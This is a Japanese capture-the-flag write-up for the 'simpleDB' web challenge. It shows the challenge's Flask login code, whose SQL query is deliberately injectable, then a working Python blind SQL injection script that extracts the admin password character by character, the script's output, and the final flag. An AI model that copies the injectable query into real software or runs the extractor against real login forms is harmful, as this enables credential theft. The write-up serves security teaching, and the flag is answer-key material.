# simpleDB:Web:172pts
adminのパスワードを特定してください！ [http://20.205.137.99:49999/](http://20.205.137.99:49999/)  
[SimpleDB.zip](SimpleDB.zip)  

# Solution
URLとソースが与えられる。  
アクセスするとログインフォームのようだ。  
![site.png](site/site.png)  
次にソースを見ると以下のようであった。  
```python
from flask import Flask, request, jsonify, render_template
import sqlite3

app = Flask(__name__)

def init_db():
    conn = sqlite3.connect('database.db')
    c = conn.cursor()
    c.execute('CREATE TABLE IF NOT EXISTS users(id INTEGER PRIMARY KEY, username TEXT, password TEXT)')
    c.execute("INSERT INTO users (username, password) VALUES ('admin', 'shioCTF{**SECRET**}')")
    conn.commit()
    conn.close()

init_db()

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        conn = sqlite3.connect('database.db')
        c = conn.cursor()
        query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
        c.execute(query)
        result = c.fetchone()
        conn.close()
        if result:
            return jsonify({'message': 'Login successful!'}), 200
        else:
            return jsonify({'message': 'Login failed!'}), 401
    else:
        return render_template('index.html')

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=49999)
```
自明なSQLiがあるが、ログインの成否しかわからない。  
adminのパスワードにフラグがあるようなのでブラインドで抜き出す。  
以下のsqli.pyで行う(今回は大文字小文字の区別がないのでLIKEでもよい)。  
```python
import sys
import string
import requests

flag = "shioCTF{"

while True:
    for c in string.printable:
        res = requests.post(
            "http://20.205.137.99:49999/",
            data={
                "username": f"admin' AND substr(password, 1, {len(flag) + 1}) = '{flag + c}'; -- satoki",
                "password": "omg",
            },
        )
        if "Login successful!" in res.text:
            flag += c
            print(flag)
            if c == "}":
                sys.exit(0)
            break
```
実行する。  
```bash
$ python sqli.py
shioCTF{b
shioCTF{b1
shioCTF{b1i
shioCTF{b1in
shioCTF{b1ind
shioCTF{b1ind_
shioCTF{b1ind_s
shioCTF{b1ind_sq
shioCTF{b1ind_sql
shioCTF{b1ind_sqli
shioCTF{b1ind_sqli_
shioCTF{b1ind_sqli_i
shioCTF{b1ind_sqli_i5
shioCTF{b1ind_sqli_i5_
shioCTF{b1ind_sqli_i5_d
shioCTF{b1ind_sqli_i5_d4
shioCTF{b1ind_sqli_i5_d4n
shioCTF{b1ind_sqli_i5_d4ng
shioCTF{b1ind_sqli_i5_d4nge
shioCTF{b1ind_sqli_i5_d4nger
shioCTF{b1ind_sqli_i5_d4nger0
shioCTF{b1ind_sqli_i5_d4nger0u
shioCTF{b1ind_sqli_i5_d4nger0u5
shioCTF{b1ind_sqli_i5_d4nger0u5!
shioCTF{b1ind_sqli_i5_d4nger0u5!}
```
flagが得られた。  

## shioCTF{b1ind_sqli_i5_d4nger0u5!}